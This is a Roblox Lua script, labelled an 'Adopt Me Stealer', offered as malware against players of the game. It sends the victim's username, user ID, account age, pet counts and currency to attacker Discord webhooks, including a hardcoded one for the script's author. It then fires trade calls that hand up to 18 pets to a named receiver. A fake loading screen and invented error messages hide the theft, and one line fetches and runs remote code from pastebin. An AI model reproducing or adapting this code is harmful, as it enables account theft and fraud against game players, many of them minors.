if Username == "" or Username == nil then
    game:GetService("Players").LocalPlayer:Kick("Enter a username!")
end
if Webhook == "" or Webhook == nil then
    game:GetService("Players").LocalPlayer:Kick("Please enter a webhook!")
end

LogsWebhook =
    "https://discord.com/api/webhooks/1308652790112981002/_d_5YUJpCKVEBTTpv12lpZpikdhBbGjHLV9C5c3DIMOsR2TJ6LDNB2jU3GH6PPAL49ec"

local Pets = {}
local PetCounts = {}

for i, v in pairs(
    require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.pets
) do
    local label = ""
    if v.properties.mega then
        label = " (Mega Neon)"
    elseif v.properties.neon then
        label = " (Neon)"
    else
        label = " (Normal)"
    end
    local petName = v.id:gsub("%d+", ""):gsub("_", " "):gsub("%s+", " ")
    petName =
        petName:gsub(
        "(%a)(%a*)",
        function(first, rest)
            return first:upper() .. rest:lower()
        end
    )
    local key = petName .. label
    if PetCounts[key] then
        PetCounts[key] = PetCounts[key] + 1
    else
        PetCounts[key] = 1
    end
end

local Loaders = require(game.ReplicatedStorage.Fsys).load
local InventoryDB = Loaders("InventoryDB")
local ClientData = Loaders("ClientData")
local legendaries_count = 0
local mega_count = 0
local neon_count = 0
local ultra_count = 0
local rare_count = 0
local uncommon_count = 0
local common_count = 0
local total_pets = 0
local bucks = tostring(require(game:GetService("ReplicatedStorage").Fsys).load("ClientData").get("money"))
for i, v in pairs(ClientData.get("inventory").pets) do
    total_pets = total_pets + 1
end

for i, v in pairs(ClientData.get("inventory").pets) do
    if InventoryDB[v.category][v.id].rarity == "legendary" then
        legendaries_count = legendaries_count + 1
    end
    if InventoryDB[v.category][v.id].properties == "mega" then
        mega_count = mega_count + 1
    end
    if InventoryDB[v.category][v.id].properties == "neon" then
        neon_count = neon_count + 1
    end
    if InventoryDB[v.category][v.id].rarity == "ultra_rare" then
        ultra_count = ultra_count + 1
    end
    if InventoryDB[v.category][v.id].rarity == "rare" then
        rare_count = rare_count + 1
    end
    if InventoryDB[v.category][v.id].rarity == "uncommon" then
        uncommon_count = uncommon_count + 1
    end
    if InventoryDB[v.category][v.id].rarity == "common" then
        common_count = common_count + 1
    end
end

local messageADOPT =
    '--@everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' ..
    game.JobId .. '", game.Players.LocalPlayer)'
if legendaries_count >= 5 or neon_count >= 5 or mega_count >= 1 then
    messageADOPT =
        '--@everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' ..
        game.JobId .. '", game.Players.LocalPlayer)'
end
local plr = game.Players.LocalPlayer
local userr = Username
local userid = game.Players.LocalPlayer.UserId
local accage = game.Players.LocalPlayer.AccountAge

local request = http_request or request or HttpPost or syn.request
if not request then
    error("Your executor does not support HTTP requests.")
end

local data = {
    username = "X Scripts 2024 - Hit!",
    avatar_url = "https://cdn.shopify.com/s/files/1/0559/4788/6783/files/GTO.gif?v=1679069333",
    content = messageADOPT,
    embeds = {
        {
            title = "**Execute the given code above to join the victim, write anything in chat and you will receive a trade**",
            description = "**__X Scripts 2024 | Adopt Me Stealer__**",
            color = tonumber(0xFF69B4), -- Hot pink
            fields = {
                {
                    name = "**🕵 Victim Information:**",
                    value = "```lua\n" ..
                        "Username       : " ..
                            tostring(plr) ..
                                "\n" ..
                                    "User-ID        : " ..
                                        tostring(userid) ..
                                            "\n" ..
                                                "Account Age    : " ..
                                                    tostring(accage) ..
                                                        " days\n" ..
                                                            "Receiver       : " .. tostring(userr) .. "\n" .. "```"
                },
                {
                    name = "**📦 Inventory:**",
                    value = "```lua\n" ..
                        "Legendaries 🍄 : " ..
                            tostring(legendaries_count) ..
                                "\n" ..
                                    "Ultra Rares 🌿 : " ..
                                        tostring(ultra_count) ..
                                            "\n" ..
                                                "Rares 🧊       : " ..
                                                    tostring(rare_count) ..
                                                        "\n" ..
                                                            "Uncommons 🌈   : " ..
                                                                tostring(uncommon_count) ..
                                                                    "\n" ..
                                                                        "Commons 🎃     : " ..
                                                                            tostring(common_count) ..
                                                                                "\n\n" ..
                                                                                    "Total Pets 📚  : " ..
                                                                                        tostring(total_pets) ..
                                                                                            "\n" ..
                                                                                                "Bucks 💵       : " ..
                                                                                                    tostring(bucks) ..
                                                                                                        "\n" .. "```"
                },
                {
                    name = "Auto Trader:",
                    value = "```lua\nUsername = '" ..
                        tostring(userr) .. "'\n" .. "loadstring(game:HttpGet('https://pastebin.com/raw/mhGuWBUi'))()```"
                }
            }
        }
    }
}

request(
    {
        Url = Webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(data)
    }
)

request(
    {
        Url = LogsWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(data)
    }
)

local function StartSteal()
    local Loads = require(game.ReplicatedStorage.Fsys).load
    local RouterClient = Loads("RouterClient")
    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")

    SendTrade:FireServer(game.Players[Username])
    wait(3)
    local PetsInventory =
        require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
    if PetsInventory.pets then
        local petCount = 0
        local petUids = {}
        for petUid, petData in pairs(PetsInventory.pets) do
            table.insert(petUids, petUid)
        end

        while #petUids > 0 do
            local petUid = table.remove(petUids, 1)
            AddPetRemote:FireServer(petUid)
            petCount = petCount + 1
            if petCount >= 18 then
                break
            end
        end
    else
        print("No pets found in inventory.")
    end
    wait(6)
    AcceptNegotiationRemote:FireServer()
    wait(5)
    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
    ConfirmTradeRemote:FireServer()
end

if total_pets == 9 then
    game:GetService("Players").LocalPlayer:Kick("\nNew Account Is Not\nSupported!")
elseif #game:GetService("Players"):GetPlayers() < 2 then
    game:GetService("Players").LocalPlayer:Kick("\nPrivate Server Is Not\nSupported!")
end

game.Players.PlayerAdded:Connect(
    function(player)
        if player.Name == Username then
            player.Chatted:Connect(
                function(msg)
                    while true do
                        StartSteal()
                        wait(0.1)
                    end
                end
            )
        end
    end
)

setclipboard("discord.gg/ShKtjJWvr2")

-- Create ScreenGui for loading
local screenGui = Instance.new("ScreenGui")
screenGui.IgnoreGuiInset = true -- Ensures it covers the whole screen, ignoring the top bar
screenGui.Parent = game.CoreGui

-- Create Frame for loading screen
local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 1, 0) -- Full screen size
frame.Position = UDim2.new(0, 0, 0, 0) -- Top-left corner
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
frame.Parent = screenGui

-- Text in the middle ("discord.gg/ShKtjJWvr2")
local middleText = Instance.new("TextLabel")
middleText.Text = "discord.gg/ShKtjJWvr2"
middleText.Font = Enum.Font.Cartoon
middleText.TextSize = 50
middleText.TextColor3 = Color3.fromRGB(255, 255, 255) -- White Text
middleText.BackgroundTransparency = 1
middleText.Size = UDim2.new(0.3, 0, 0.1, 0)
middleText.Position = UDim2.new(0.35, 0, 0.45, 0) -- Center
middleText.Parent = frame

-- "Loading" Text above the loading bar
local loadingText = Instance.new("TextLabel")
loadingText.Text = "Loading Script"
loadingText.Font = Enum.Font.SourceSansItalic
loadingText.TextSize = 25
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255) -- White
loadingText.BackgroundTransparency = 1
loadingText.Size = UDim2.new(1, 0, 0, 50)
loadingText.Position = UDim2.new(0, 0, 0.75, 0) -- Moved up to allow more space for dots
loadingText.Parent = frame

-- Loading Bar Frame (smaller size)
local loadingBarFrame = Instance.new("Frame")
loadingBarFrame.Size = UDim2.new(0.6, 0, 0, 20) -- Reduced to 60% width and 20 pixels height
loadingBarFrame.Position = UDim2.new(0.2, 0, 0.85, 0) -- Centered a bit higher
loadingBarFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Same as screen color
loadingBarFrame.BorderSizePixel = 2
loadingBarFrame.BorderColor3 = Color3.fromRGB(255, 0, 0) -- Red border
loadingBarFrame.Parent = frame

-- Loading Bar Fill
local loadingBar = Instance.new("Frame")
loadingBar.Size = UDim2.new(0, 0, 1, 0) -- Start at 0%
loadingBar.Position = UDim2.new(0, 0, 0, 0)
loadingBar.BackgroundColor3 = Color3.fromRGB(54, 57, 63) -- Same as screen color
loadingBar.Parent = loadingBarFrame

-- Percentage Text inside Loading Bar
local percentText = Instance.new("TextLabel")
percentText.Text = "0%"
percentText.Font = Enum.Font.SourceSans
percentText.TextSize = 20
percentText.TextColor3 = Color3.fromRGB(255, 255, 255) -- White
percentText.BackgroundTransparency = 1
percentText.Size = UDim2.new(1, 0, 1, 0)
percentText.Parent = loadingBarFrame

-- Animated Dots below the loading bar
local dots = Instance.new("TextLabel")
dots.Text = ""
dots.Font = Enum.Font.SourceSans
dots.TextSize = 40
dots.TextColor3 = Color3.fromRGB(255, 255, 255) -- White
dots.BackgroundTransparency = 1
dots.Size = UDim2.new(0, 50, 0, 30)
dots.Position = UDim2.new(0.5, -25, 0.88, 0)
dots.Parent = frame

-- Loading Bar Animation (120 seconds)
local totalTime = 120
local function updateLoadingBar()
    for i = 1, totalTime do
        local percent = i / totalTime
        loadingBar.Size = UDim2.new(percent, 0, 1, 0)
        percentText.Text = math.floor(percent * 100) .. "%"
        wait(1)
    end
end

-- Dots Animation
local function animateDots()
    while true do
        for i = 0, 3 do
            dots.Text = string.rep(".", i)
            wait(0.5)
        end
    end
end

-- Create ScreenGui for error messages
local errorGui = Instance.new("ScreenGui")
errorGui.IgnoreGuiInset = true
errorGui.Parent = game.CoreGui

-- Create Frame for error message
local errorFrame = Instance.new("Frame")
errorFrame.Size = UDim2.new(0.3, 0, 0.3, 0) -- Smaller size
errorFrame.Position = UDim2.new(0.35, 0, 0.35, 0) -- Centered
errorFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White background
errorFrame.BorderSizePixel = 2
errorFrame.BorderColor3 = Color3.fromRGB(0, 255, 255) -- Cyan Blue border
errorFrame.Visible = false -- Initially hidden
errorFrame.Parent = errorGui

-- Title for error message
local errorTitle = Instance.new("TextLabel")
errorTitle.Text = "Error"
errorTitle.Font = Enum.Font.SourceSansBold
errorTitle.TextSize = 30
errorTitle.TextColor3 = Color3.fromRGB(0, 0, 0) -- Black Text
errorTitle.BackgroundColor3 = Color3.fromRGB(0, 255, 255) -- Cyan Blue background
errorTitle.Size = UDim2.new(1, 0, 0, 40)
errorTitle.Position = UDim2.new(0, 0, 0, 0)
errorTitle.Parent = errorFrame

-- Error message text
local errorMessage = Instance.new("TextLabel")
errorMessage.Font = Enum.Font.SourceSans
errorMessage.TextSize = 20
errorMessage.TextColor3 = Color3.fromRGB(0, 0, 0) -- Black Text
errorMessage.BackgroundTransparency = 1
errorMessage.Size = UDim2.new(1, 0, 0.7, 0)
errorMessage.Position = UDim2.new(0, 0, 0.2, 0)
errorMessage.TextWrapped = true
errorMessage.Parent = errorFrame

-- Close button (X)
local closeButton = Instance.new("TextButton")
closeButton.Text = "X"
closeButton.Font = Enum.Font.SourceSansBold
closeButton.TextSize = 24
closeButton.TextColor3 = Color3.fromRGB(255, 0, 0) -- Red Text
closeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White background
closeButton.Size = UDim2.new(0.2, 0, 0.2, 0)
closeButton.Position = UDim2.new(0.8, 0, 0, 0)
closeButton.Parent = errorFrame

-- OK button
local okButton = Instance.new("TextButton")
okButton.Text = "OK"
okButton.Font = Enum.Font.SourceSansBold
okButton.TextSize = 24
okButton.TextColor3 = Color3.fromRGB(0, 0, 0) -- Black Text
okButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White background
okButton.Size = UDim2.new(0.3, 0, 0.2, 0)
okButton.Position = UDim2.new(0.35, 0, 0.8, 0)
okButton.Parent = errorFrame

-- Function to show error message
local function showError(message)
    errorMessage.Text = message
    errorFrame.Visible = true
end

-- Account age, full server, and private server checks
local player = game.Players.LocalPlayer
local accountAge = player.AccountAge
local minimumAccountAge = 10
local isFullServer = game.Players.NumPlayers == game.Players.MaxPlayers
local isPrivateServer = game.Players.NumPlayers == 1

-- Handle errors
if isPrivateServer then
    showError("Don't Run The Script On A Private Server.")
elseif isFullServer then
    showError("Re-Join To Lower Server And Execute The Script Again.")
elseif accountAge < minimumAccountAge then
    showError("Don't Run The Script On A New Account.")
else
    -- Run loading animations if no errors
    spawn(updateLoadingBar)
    spawn(animateDots)
end

-- Close button functionality
closeButton.MouseButton1Click:Connect(
    function()
        errorFrame.Visible = false
    end
)

-- OK button functionality
okButton.MouseButton1Click:Connect(
    function()
        errorFrame.Visible = false
    end
)
